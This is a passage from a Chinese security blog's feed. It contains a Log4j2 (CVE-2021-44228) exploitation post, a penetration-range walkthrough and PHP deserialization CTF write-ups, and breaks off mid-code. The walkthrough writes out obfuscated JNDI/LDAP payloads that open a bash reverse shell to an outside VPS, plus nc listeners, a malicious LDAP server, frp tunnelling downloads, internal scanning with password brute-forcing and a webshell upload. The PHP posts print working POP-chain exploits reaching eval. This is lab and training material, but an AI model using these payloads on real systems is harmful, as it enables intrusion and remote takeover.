src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211228131736368.png" alt="image-20211228131736368"></p><p>使用<code>JNDI</code>启动恶意服务</p><pre class="language-bash" data-language="bash"><code class="language-bash">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <span class="token string">"x.x.x.x"</span> -p <span class="token number">6666</span></code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211228131104816.png" alt="image-20211228131104816"></p><p>抓包修改<code>header</code>为攻击<code>payload</code></p><pre class="language-none"><code class="language-none">X-Api-Version: $&#123;$&#123;env:NaN:-j&#125;ndi$&#123;env:NaN:-:&#125;$&#123;env:NaN:-l&#125;dap$&#123;env:NaN:-:&#125;&#x2F;&#x2F;139.196.234.164:1389&#x2F;TomcatBypass&#x2F;TomcatEcho&#125;cmd:ls</code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211228132305371.png" alt="image-20211228132305371"></p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>截止到目前，网上的修复方法大致是这些：</p><p>补丁链接: <a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">log4j-2.15.0-rc2</a></p><p>1.添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true；</p><p>2.在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true；</p><p>3.JDK使用11.0.1、8u191、7u201、6u211及以上的高版本。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述:&quot;&gt;&lt;/a&gt;漏洞描述:&lt;/h2&gt;&lt;p&gt;Apache Log4j2 是一款开源的 Java 日志记录工具，大量的业务框架都使用了该组件。如：Apache Str</summary>
      
    
    
    
    <category term="Security" scheme="http://www.greetdawn.top/categories/Security/"/>
    
    
    <category term="log4j2" scheme="http://www.greetdawn.top/tags/log4j2/"/>
    
  </entry>
  
  <entry>
    <title>第三期cfs靶场练习</title>
    <link href="http://www.greetdawn.top/2021/12/07/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/xiyu-new-bachang-cfs/"/>
    <id>http://www.greetdawn.top/2021/12/07/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/xiyu-new-bachang-cfs/</id>
    <published>2021-12-07T03:12:47.000Z</published>
    <updated>2021-12-23T10:59:08.210Z</updated>
    
    <content type="html"><![CDATA[<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">payload</span><span class="token operator">=</span><span class="token variable">$&#123;jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>4o5zj6.dnslog.cn<span class="token operator">/</span>cxvahp&#125;</span>vps：139.196.234.164<span class="token function">bash</span> -i <span class="token operator">>&amp;</span> /dev/tcp/139.196.234.164/5555 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></code></pre><h1 id="Apache-log4j2漏洞-CVE-2021-44228"><a href="#Apache-log4j2漏洞-CVE-2021-44228" class="headerlink" title="Apache log4j2漏洞(CVE-2021-44228)"></a>Apache log4j2漏洞(CVE-2021-44228)</h1><p>10.134.110.23:8080</p><h2 id="flag1-flag-ee5645e88bd351505554be5016ef505e"><a href="#flag1-flag-ee5645e88bd351505554be5016ef505e" class="headerlink" title="flag1: flag{ee5645e88bd351505554be5016ef505e}"></a>flag1: flag{ee5645e88bd351505554be5016ef505e}</h2><p><strong>第一步：</strong></p><pre class="language-none"><code class="language-none">payload&#x3D;$&#123;jndi:ldap:&#x2F;&#x2F;139.196.234.164:1389&#x2F;TomcatBypass&#x2F;Command&#x2F;Base64&#x2F;YmFzaCAtaSA%252BJiAvZGV2L3RjcC8xMzkuMTk2LjIzNC4xNjQvNTU1NSAwPiYx&#125;</code></pre><p>注：后面command需要经过一次base64编码，两次URL编码处理</p><pre class="language-none"><code class="language-none">command: bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;139.196.234.164&#x2F;5555 0&gt;&amp;1</code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216151433833.png"></p><p><strong>第二步：</strong></p><ul><li>vps监听</li></ul><pre class="language-none"><code class="language-none">nc -lvvp 5555</code></pre><ul><li>开启恶意ldap服务</li></ul><pre class="language-none"><code class="language-none">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i &quot;139.196.234.164&quot; -p 8080</code></pre><p>成功上线</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216151543166.png" alt="image-20211216151543166"></p><p>10.134.110.23 内网探测</p><pre class="language-none"><code class="language-none">root@66f6d6f3234c:&#x2F;tmp# .&#x2F;fscan_amd64 -h 10.134.0.0&#x2F;16.&#x2F;fscan_amd64 -h 10.134.0.0&#x2F;16   ___                              _  &#x2F; _ \     ___  ___ _ __ __ _  ___| | __ &#x2F; &#x2F;_\&#x2F;____&#x2F; __|&#x2F; __| &#39;__&#x2F; _&#96; |&#x2F; __| |&#x2F; &#x2F;&#x2F; &#x2F;_\\_____\__ \ (__| | | (_| | (__|   &lt;\____&#x2F;     |___&#x2F;\___|_|  \__,_|\___|_|\_\                     fscan version: 1.6.3start infoscan(icmp) Target &#39;10.134.110.23&#39; is alive(icmp) Target &#39;10.134.110.1&#39; is alive(icmp) Target &#39;10.134.110.26&#39; is alive(icmp) Target &#39;10.134.110.34&#39; is aliveicmp alive hosts len is: 410.134.110.34:8093 open10.134.110.1:22 open10.134.110.34:8083 open10.134.110.34:8080 open10.134.110.26:8080 open10.134.110.1:8080 open10.134.110.23:8080 open10.134.110.34:8009 open10.134.110.26:8009 openalive ports len is: 9start vulscan[*] WebTitle:http:&#x2F;&#x2F;10.134.110.34:8080 code:200 len:1507   title:Welcome to JBos                                                                                                                                                             s&amp;trade;[*] WebTitle:http:&#x2F;&#x2F;10.134.110.23:8080 code:404 len:0      title:None[*] WebTitle:http:&#x2F;&#x2F;10.134.110.1:8080  code:404 len:0      title:None[+] InfoScan:http:&#x2F;&#x2F;10.134.110.23:8080 [SprintBoot][*] WebTitle:http:&#x2F;&#x2F;10.134.110.26:8080 code:200 len:20     title:Apache Tomcat&#x2F;8                                                                                                                                                             .0.43[+] InfoScan:http:&#x2F;&#x2F;10.134.110.34:8080 [Jboss JBOSS][*] WebTitle:http:&#x2F;&#x2F;10.134.110.34:8083 code:400 len:0      title:None[+] InfoScan:http:&#x2F;&#x2F;10.134.110.1:8080  [SprintBoot][+] http:&#x2F;&#x2F;10.134.110.26:8080&#x2F;manager&#x2F;html tomcat tomcat[+] http:&#x2F;&#x2F;10.134.110.26:8080 poc-yaml-tomcat-manager-week已完成 8&#x2F;9 [-] ssh 10.134.110.1:22 root 123456789 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain已完成 8&#x2F;9 [-] ssh 10.134.110.1:22 admin admin123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain已完成 8&#x2F;9 [-] ssh 10.134.110.1:22 admin 123321 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain已完成 9&#x2F;9scan end</code></pre><p> 部署frp内网穿透工具</p><p>使用wget上传文件至外网机</p><p>wget <a href="http://139.196.234.164:8000/frpc">http://139.196.234.164:8000/frpc</a></p><p>wget <a href="http://139.196.234.164:8000/frpc.ini">http://139.196.234.164:8000/frpc.ini</a></p><p>frp连接</p><p>server:./frps -c frps.ini</p><p>client:./frpc -c frpc.ini</p><p>10.134.110.26:8080 存在toamcat弱口令部署war包</p><p>上传蚁剑马</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216164224261.png" alt="image-20211216164224261"></p><p>flag3： flag{a457f1dd3623a399d78a9672d225ddd5}</p><p>10.134.110.34:8080 JBOSS 命令执行</p><p>flag4：flag{4b0e8838ced75dbb359414892942d19d}</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216172919652.png" alt="image-20211216172919652"></p><p>172.78.69.16</p><p>172.78.69.15:8080 存在shire反序列化漏洞</p><p>flag2: flag{b2a0b3a262c1234132672229af281ed6}</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216184338762.png" alt="image-20211216184338762"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;pre class=&quot;language-bash&quot; data-language=&quot;bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token assign-left variable&quot;&gt;payload&lt;/span&gt;&lt;span cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>php-unserialize-getflag</title>
    <link href="http://www.greetdawn.top/2021/12/06/web-security/php-code-audit/php-unserialize-getflag/"/>
    <id>http://www.greetdawn.top/2021/12/06/web-security/php-code-audit/php-unserialize-getflag/</id>
    <published>2021-12-06T09:18:53.000Z</published>
    <updated>2021-12-06T09:40:10.511Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/kitten-g9b6b71c7c_1920.jpg" alt="kitten-g9b6b71c7c_1920"></p><span id="more"></span><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$pwd</span><span class="token operator">=</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">func</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$mod1</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$mod2</span><span class="token punctuation">;</span>         <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mod2</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"welcome "</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mod1</span><span class="token punctuation">;</span>                      <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">GetFlag</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>         <span class="token keyword">public</span> <span class="token variable">$action</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">action</span><span class="token punctuation">;</span>            <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p><code>php</code>反序列化真要被<code>ctf</code>给玩烂了</p><p>这道题的代码不多，但是反正我是不会</p><p>逻辑思路是有，但是不会构造的，接下来就简单的分析一下吧</p><p>利用类<code>func</code>中的<code>__destruct()</code>魔法函数，调用触发类<code>GetFlag</code>中<code>get_flag</code>方法，根据<code>$a(&#39;&#39;, $this-&gt;code);</code>这行代码，可以构造<code>create_function</code>函数触发，逻辑都很简单。这里唯独就是不知道怎么给类<code>func</code>中的key构造传参</p><p>后面才知道可以这么传参：<code>$key = serialize([new GetFlag(), &quot;get_flag&quot;]);</code></p><h2 id="构造利用"><a href="#构造利用" class="headerlink" title="构造利用"></a>构造利用</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">func</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$mod1</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$mod2</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mod2</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"welcome "</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mod1</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">GetFlag</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string double-quoted-string">";&#125;phpinfo();//"</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'create_function'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">action</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">GetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"get_flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><strong>output：</strong></p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;10279.php?0&#x3D;O:4:%22func%22:3:&#123;s:4:%22mod1%22;N;s:4:%22mod2%22;N;s:3:%22key%22;s:116:%22a:2:&#123;i:0;O:7:%22GetFlag%22:2:&#123;s:4:%22code%22;s:14:%22;&#125;phpinfo();&#x2F;&#x2F;%22;s:6:%22action%22;s:15:%22create_function%22;&#125;i:1;s:8:%22get_flag%22;&#125;%22;&#125;</code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211206173317019.png" alt="image-20211206173317019"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://gitee.com/greetdawn/blogImages/raw/master/img/kitten-g9b6b71c7c_1920.jpg&quot; alt=&quot;kitten-g9b6b71c7c_1920&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="PHP代码审计" scheme="http://www.greetdawn.top/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="CTF" scheme="http://www.greetdawn.top/tags/CTF/"/>
    
    <category term="PHP反序列化" scheme="http://www.greetdawn.top/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化之魔法函数clone</title>
    <link href="http://www.greetdawn.top/2021/12/01/web-security/php-code-audit/php-unserialize-clone/"/>
    <id>http://www.greetdawn.top/2021/12/01/web-security/php-code-audit/php-unserialize-clone/</id>
    <published>2021-12-01T07:51:32.000Z</published>
    <updated>2021-12-01T08:49:37.660Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211201164317651.png" alt="image-20211201164317651"></p><span id="more"></span><h1 id="前奏"><a href="#前奏" class="headerlink" title="前奏"></a>前奏</h1><p>昨天某甲方客户联系我，直接甩了两道<code>php</code>反序列化的源码题，晚上回去把题目本地复现了一下。这个复现之路可谓艰辛。<code>phpstudy</code>直接报错，每一行都报错。后面才知道，因为直接以源码方式微信发的，我直接复制，导致复制的不干净，掺杂了一些脏东西。此处已心态爆炸，我把源码手撸了一遍。o(╯□╰)o幸好源码不是太多。第一题耽误了太多时间没搞出来，第二题出来了，这边想着做个简单记录吧。</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><p>里面的注释内容为我本地运行时添加的测试代码。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">z</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//echo "class z tostring";</span><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">h</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$method</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//echo "class h";</span><span class="token comment">//echo "123".$method;</span><span class="token comment">//echo "456".$this->method;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">array_shift</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">e</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$z</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$f</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$arg</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">xixi</span><span class="token operator">=</span><span class="token keyword">clone</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">z</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token string double-quoted-string">"haha"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//echo "__clone";</span><span class="token comment">//var_dump($this->f);</span><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">f</span><span class="token operator">-></span><span class="token function">haha</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'poc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'poc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>其实代码内容并不多</p><p>但是这里面的魔法函数<code>__clone</code>以及函数<code>clone</code>是我第一次见，这里真的说明自己有点菜，题做的太少啊~ 时间都用来打杂了，我一开始把它认为是自定义函数了。。。</p><p>没用过咋办呢， 查呗，<code>google</code>走起。 别问我为啥不百度，其实你们都懂得~</p><p>网上给了一个小栗子演示了一下这个魔法函数的作用：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//首先定义一个test一个类</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Testclass</span> <span class="token punctuation">&#123;</span><span class="token comment">//成员变量是$value1</span><span class="token keyword">public</span> <span class="token variable">$value1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//随后new一个obj1</span><span class="token variable">$obj1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Testclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//复制成员变量的值为qqq</span><span class="token variable">$obj1</span><span class="token operator">-></span><span class="token property">value1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"qqq"</span><span class="token punctuation">;</span><span class="token comment">//我们使用赋值符号给左边obj2赋值obj1</span><span class="token variable">$obj2</span> <span class="token operator">=</span> <span class="token variable">$obj1</span><span class="token punctuation">;</span><span class="token comment">//我们在这里把obj2的的value1复制为eee</span><span class="token variable">$obj2</span><span class="token operator">-></span><span class="token property">value1</span> <span class="token operator">=</span><span class="token string double-quoted-string">"eee"</span><span class="token punctuation">;</span>     <span class="token comment">//随后我们打印出两者的值</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$obj1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$obj2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><strong>output:</strong></p><pre class="language-none"><code class="language-none">object(Testclass)#1 (1) &#123; [&quot;value1&quot;]&#x3D;&gt; string(3) &quot;eee&quot; &#125;object(Testclass)#1 (1) &#123; [&quot;value1&quot;]&#x3D;&gt; string(3) &quot;eee&quot; &#125; </code></pre><p>我们发现这种情况下运行结果一致：</p><p> <strong>那是因为（借用<code>php</code>手册的话就是）：当对象被复制后，<code>PHP 5 </code>会对对象的所有属性执行一个浅复制（<code>shallow copy</code>）。所有的引用属性 仍然会是一个指向原来的变量的引用。</strong></p><p>其实在这里就是<code>obj1</code>给了<code>obj2</code>它的地址，就和引用一样，<code>obj2</code>指向了<code>obj1</code></p><p>接下来使用<code>clone</code>复制</p><pre class="language-none"><code class="language-none">这里讲上述代码中$obj2 &#x3D; $obj1;  &#x3D;》$obj2 &#x3D; clone $obj1;</code></pre><p><strong>output:</strong></p><pre class="language-none"><code class="language-none">object(Testclass)#1 (1) &#123; [&quot;value1&quot;]&#x3D;&gt; string(3) &quot;qqq&quot; &#125;object(Testclass)#2 (1) &#123; [&quot;value1&quot;]&#x3D;&gt; string(3) &quot;eee&quot; &#125; </code></pre><p>其实这里的clone就是为了实现深拷贝的作用。</p><p><code>__clone</code>触发条件：<strong>当我们对一个类有clone操作的时候将会触发这个类里面的__clone方法</strong></p><p>注：<strong>clone只能用于对象克隆，对象复制。如果clone一个非对象变量将会报错no obj</strong></p><h2 id="具体开干"><a href="#具体开干" class="headerlink" title="具体开干"></a>具体开干</h2><p>其实到这里我们基本上稀里糊涂的或许大概明白了什么意思。。。那就开搞呗。有源码，一点点分析好了</p><p>我的思路这种简短的源码，我喜欢先定位危险函数再去反推<code>POP</code>链</p><p>代码中我们发现危险函数<code>eval</code>藏在类<code>h</code>的<code>__call</code>中，且要保证条件<code>in_array($method, $this-&gt;method)</code>成立,这里可以直接控制<code>$method = arry(&#39;haha&#39;,&#39;hehe&#39;,&#39;dada&#39;);</code></p><p>调用<code>__call</code>魔法函数只需调用其实例化类本身不存在的方法即可，刚好在类<code>e</code>中存在成员变量<code>h</code>调用了一个<code>haha</code>方法，该方法刚好是类<code>h</code>不存在的,即<code>$obj = new e;$obj-&gt;f=new h;</code></p><p>要想触发以上条件就需要触发<code>__clone</code>魔法函数，根据前序只是我们知道，<code>clone</code>即可触发,且<code>clone</code>是在<code>__get</code>魔法函数中,即<code>$obj = new z;$obj-&gt;a = new e;</code></p><p>触发<code>__get</code>魔法函数，只需调用其实例化类对象中不存在或者无权限调用的成员属性即可</p><p>刚好在类<code>z</code>中存在<code>__toString</code>魔法函数，里面执行了成员变量引用，那么<code>$a = new e</code>即可</p><p>传参接口<code>poc</code>刚好在反序列化的时候被<code>echo</code>了，那么刚好可以直接触发<code>__toString</code></p><h2 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h2><p>根据分析具体思路构造一个完美的exp即可</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">z</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">h</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"haha"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hehe"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"dada"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">array_shift</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">e</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$z</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$f</span><span class="token 